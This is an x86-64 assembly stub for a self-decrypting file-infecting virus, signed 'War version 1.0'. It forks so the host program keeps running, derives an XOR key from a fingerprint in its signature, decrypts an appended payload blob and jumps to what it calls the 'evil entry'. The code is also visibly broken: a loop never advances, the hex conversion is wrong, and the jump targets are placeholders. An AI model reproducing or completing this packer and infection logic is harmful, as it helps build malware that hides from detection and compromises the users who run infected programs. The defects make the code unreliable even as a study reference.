BITS 64
start:
endbr64
push rax
mov rax, 57
syscall
test rax, rax
pop rax
jnz 0x000000 ; parent jump to og entry
push rax
push r11
push rdi
push r12

; put finger value in r11d
xor r11d, r11d
mov rdi, 0
fingerloop:
cmp rdi, 8
je endfingerloop
mov al, [sign + rdi + 47]
call hextoval
add r11d, eax
imul r11d, r11d, 16
jmp fingerloop
endfingerloop:

; decrypt
mov rdi, 0
loop:
mov rax, 0xdeadbeed
cmp rdi, rax
je endloop
mov r12d, [blob + rdi * 4]
xor r12d, r11d
mov [blob + rdi * 4], r12d
inc rdi
jmp loop
endloop:

pop r12
pop rdi
pop r11
pop rax
jmp 0x000000 ; jump to evil entry

hextoval:
cmp al, 10 + '0'
jge letter
sub al, '0'
ret
letter:
sub al, 'A'
ret

sign: db 10, "War version 1.0 (c)oded by xxxxxxx - yyyyyy - [42694269]", 10 , 0
blob:
